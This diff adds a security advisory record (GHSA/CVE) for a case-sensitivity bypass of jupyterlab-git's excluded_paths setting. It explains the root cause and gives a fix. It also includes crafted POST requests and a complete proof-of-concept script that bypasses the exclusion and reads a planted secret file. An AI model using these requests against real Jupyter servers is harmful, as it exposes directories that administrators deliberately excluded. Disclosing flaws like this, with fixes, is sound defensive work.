@@ -1,0 +1,134 @@
+{
+  "id": "GHSA-436q-jwfr-rm2h",
+  "modified": "2026-06-19T19:45:55.633425945Z",
+  "published": "2026-06-19T19:36:22Z",
+  "aliases": [
+    "CVE-2026-54528"
+  ],
+  "summary": "jupyterlab-git excluded_paths Case-Sensitivity Bypass Allows Reading Excluded Directories",
+  "details": "## Summary\n\n`jupyterlab-git` 0.53.0 (latest, 2026-04-30) uses `fnmatch.fnmatchcase()` in `GitHandler.prepare()` (`jupyterlab_git/handlers.py:91`) to enforce the admin-configured `excluded_paths` security control. Because `fnmatchcase` is unconditionally case-sensitive, an authenticated user on a case-insensitive filesystem (macOS APFS, Windows NTFS) can bypass the exclusion by varying the case of the URL path segment — e.g. requesting `/git/project/Secrets/...` instead of `/git/project/secrets/...` — gaining read access to git history, file content, and status in directories the administrator explicitly excluded.\n\n## Vulnerable Code\n\n```python\n# jupyterlab_git/handlers.py:84-92\nasync def prepare(self):\n    \"\"\"Check if the path should be skipped\"\"\"\n    await ensure_async(super().prepare())\n    path = self.path_kwargs.get(\"path\")\n    if path is not None:\n        excluded_paths = self.git.excluded_paths\n        for excluded_path in excluded_paths:\n            if fnmatch.fnmatchcase(path, excluded_path):  # ← always case-sensitive\n                raise tornado.web.HTTPError(404)\n```\n\n## Root Cause\n\n`fnmatch.fnmatchcase()` is unconditionally case-sensitive regardless of the operating system. Contrast with `fnmatch.fnmatch()` which normalizes via `os.path.normcase()` on case-insensitive platforms.\n\n```python\nfnmatch.fnmatchcase(\"/project/secrets\", \"/project/secrets\")  # True  — blocked\nfnmatch.fnmatchcase(\"/project/Secrets\", \"/project/secrets\")  # False — bypasses check\n```\n\nOn macOS APFS and Windows NTFS, `/project/Secrets` and `/project/secrets` resolve to the same directory on disk. The exclusion check rejects only the exact-case match, but the downstream `url2localpath()` resolves the case-varied path to the same filesystem location.\n\n## Impact\n\nAn authenticated JupyterLab user with access to the affected Jupyter server can bypass admin-configured `excluded_paths` by varying the case of the URL path segment. This grants:\n\n- Read file content at any git ref (`/content` endpoint)\n- Read working tree files in the excluded directory\n- View git status, log, diff on the excluded path\n- Enumerate commits touching excluded files\n\n## Attack Scenario\n\n1. Admin configures `c.JupyterLabGit.excluded_paths = [\"/project/secrets\", \"/project/secrets/*\"]`\n2. Normal request `POST /git/project/secrets/status` → HTTP 404 (blocked)\n3. Attacker requests `POST /git/project/Secrets/status` → HTTP 200 (bypass)\n4. Attacker reads secret: `POST /git/project/Secrets/content` with `{\"filename\": \"./cred.txt\", \"reference\": {\"git\": \"HEAD\"}}` → file content returned\n\n## Exploit\n\nSee `poc.py`. Starts a real jupyter-server with jupyterlab-git loaded, configures `excluded_paths`, and demonstrates bypass + exfiltration via HTTP.\n```python\nimport json, os, shutil, subprocess, sys, tempfile, time\nimport urllib.request, urllib.error\n\nfrom jupyterlab_git.handlers import GitHandler  # real import, no mock\nfrom jupyterlab_git_core.git import Git\nimport jupyterlab_git_core\n\nPORT = 18895\nTOKEN = \"xtoken\"\nBASE_URL = f\"http://127.0.0.1:{PORT}\"\nSECRET = \"sk-PROD-a8f2x9q-LIVE-KEY\"\n\n\ndef post(path_seg, endpoint, body=None):\n    url = f\"{BASE_URL}/git/{path_seg}{endpoint}\"\n    data = json.dumps(body or {}).encode()\n    req = urllib.request.Request(url, data=data, method=\"POST\",\n        headers={\"Authorization\": f\"token {TOKEN}\", \"Content-Type\": \"application/json\"})\n    try:\n        resp = urllib.request.urlopen(req, timeout=10)\n        return resp.status, json.loads(resp.read())\n    except urllib.error.HTTPError as e:\n        return e.code, e.read().decode()\n\n\ndef main():\n    base_dir = tempfile.mkdtemp(prefix=\"jlgit_\")\n    workspace = os.path.join(base_dir, \"workspace\")\n    repo_dir = os.path.join(workspace, \"project\")\n    secret_dir = os.path.join(repo_dir, \"secrets\")\n    os.makedirs(secret_dir)\n\n    with open(os.path.join(secret_dir, \"cred.txt\"), \"w\") as f:\n        f.write(SECRET + \"\\n\")\n\n    git_env = {**os.environ, \"GIT_AUTHOR_NAME\": \"a\", \"GIT_AUTHOR_EMAIL\": \"a@x\",\n               \"GIT_COMMITTER_NAME\": \"a\", \"GIT_COMMITTER_EMAIL\": \"a@x\"}\n    subprocess.run([\"git\", \"init\"], cwd=repo_dir, capture_output=True, check=True)\n    subprocess.run([\"git\", \"add\", \".\"], cwd=repo_dir, capture_output=True, check=True)\n    subprocess.run([\"git\", \"commit\", \"-m\", \"init\"], cwd=repo_dir,\n                   capture_output=True, check=True, env=git_env)\n\n    config_path = os.path.join(base_dir, \"jupyter_server_config.py\")\n    with open(config_path, \"w\") as f:\n        f.write(f'c.ServerApp.root_dir = \"{workspace}\"\\n')\n        f.write(f'c.ServerApp.token = \"{TOKEN}\"\\n')\n        f.write(f'c.ServerApp.open_browser = False\\n')\n        f.write(f'c.ServerApp.port = {PORT}\\n')\n        f.write(f'c.ServerApp.ip = \"127.0.0.1\"\\n')\n        f.write(f'c.ServerApp.disable_check_xsrf = True\\n')\n        f.write(f'c.JupyterLabGit.excluded_paths = [\"/project/secrets\", \"/project/secrets/*\"]\\n')\n\n    env = os.environ.copy()\n    env[\"JUPYTER_CONFIG_DIR\"] = base_dir\n    env[\"JUPYTER_DATA_DIR\"] = base_dir\n    proc = subprocess.Popen(\n        [sys.executable, \"-m\", \"jupyter_server\", f\"--config={config_path}\",\n         \"--ServerApp.jpserver_extensions={'jupyterlab_git': True}\"],\n        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env, cwd=base_dir)\n\n    for _ in range(30):\n        try:\n            req = urllib.request.Request(f\"{BASE_URL}/api/status\",\n                                         headers={\"Authorization\": f\"token {TOKEN}\"})\n            if urllib.request.urlopen(req, timeout=2).status == 200:\n                break\n        except (urllib.error.URLError, OSError):\n            pass\n        time.sleep(0.5)\n    else:\n        proc.kill()\n        shutil.rmtree(base_dir, ignore_errors=True)\n        sys.exit(\"server failed to start\")\n\n    try:\n        # exclusion works\n        code, _ = post(\"project/secrets\", \"/status\")\n        blocked = code == 404\n\n        # bypass\n        code, _ = post(\"project/Secrets\", \"/status\")\n        bypassed = code == 200\n\n        # exfiltrate\n        code, body = post(\"project/Secrets\", \"/content\",\n                          {\"filename\": \"./cred.txt\", \"reference\": {\"git\": \"HEAD\"}})\n        content = body.get(\"content\", \"\") if isinstance(body, dict) else \"\"\n        exfiltrated = SECRET in content\n\n        ok = blocked and bypassed and exfiltrated\n        print(f\"exclusion enforced (lowercase): {blocked}\")\n        print(f\"bypass (case-varied):           {bypassed}\")\n        print(f\"secret exfiltrated:             {exfiltrated}\")\n        print(f\"result:                         {'VULNERABLE' if ok else 'NOT CONFIRMED'}\")\n        return ok\n\n    finally:\n        proc.terminate()\n        proc.wait(timeout=5)\n        shutil.rmtree(base_dir, ignore_errors=True)\n\n\nif __name__ == \"__main__\":\n    sys.exit(0 if main() else 1)\n\n```\n\n```bash\npip install 'jupyterlab-git==0.53.0'\npython poc.py\n```\n\u003cimg width=\"686\" height=\"146\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f5b8d349-539a-44d7-9b17-d13b5f802625\" /\u003e\n\n\n## Fix\n\n```python\nif fnmatch.fnmatch(path.lower(), excluded_path.lower()):\n    raise tornado.web.HTTPError(404)\n```\n\nOr apply `os.path.normcase()` to both operands before comparison.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "jupyterlab-git",
+        "purl": "pkg:pypi/jupyterlab-git"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.54.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.1",
+        "0.1.2",
+        "0.10.0",
+        "0.10.1",
+        "0.10.1rc0",
+        "0.11.0",
+        "0.11.0rc0",
+        "0.11.0rc1",
+        "0.2.0",
+        "0.2.2",
+        "0.20.0",
+        "0.20.0rc0",
+        "0.21.0",
+        "0.21.0a0",
+        "0.21.0a1",
+        "0.21.0rc0",
+        "0.21.1",
+        "0.22.0",
+        "0.22.1",
+        "0.22.2",
+        "0.22.3",
+        "0.23.0",
+        "0.23.1",
+        "0.23.2",
+        "0.23.3",
+        "0.24.0",
+        "0.3.0",
+        "0.30.0",
+        "0.30.0b1",
+        "0.30.0b2",
+        "0.30.0b3",
+        "0.30.1",
+        "0.31.0",
+        "0.31.0a0",
+        "0.32.0",
+        "0.32.1",
+        "0.32.2",
+        "0.32.3",
+        "0.32.4",
+        "0.33.0",
+        "0.34.0",
+        "0.34.1",
+        "0.34.2",
+        "0.35.0",
+        "0.36.0",
+        "0.37.0",
+        "0.37.1",
+        "0.38.0",
+        "0.39.0",
+        "0.39.1",
+        "0.39.2",
+        "0.39.3",
+        "0.4.4",
+        "0.40.0",
+        "0.40.1",
+        "0.41.0",
+        "0.42.0",
+        "0.42.0rc0",
+        "0.43.0",
+        "0.44.0",
+        "0.5.0",
+        "0.50.0",
+        "0.50.0a0",
+        "0.50.0a1",
+        "0.50.0a2",
+        "0.50.0rc0",
+        "0.50.1",
+        "0.50.2",
+        "0.51.0",
+        "0.51.1",
+        "0.51.2",
+        "0.51.3",
+        "0.51.4",
+        "0.52.0",
+        "0.53.0",
+        "0.53.0a0",
+        "0.53.0a1",
+        "0.54.0a0",
+        "0.54.0a1",
+        "0.6.0",
+        "0.6.1",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "0.9.0rc1",
+        "0.9.1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.53.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-436q-jwfr-rm2h/GHSA-436q-jwfr-rm2h.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-436q-jwfr-rm2h"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jupyterlab/jupyterlab-git"
+    }
+  ]
+}
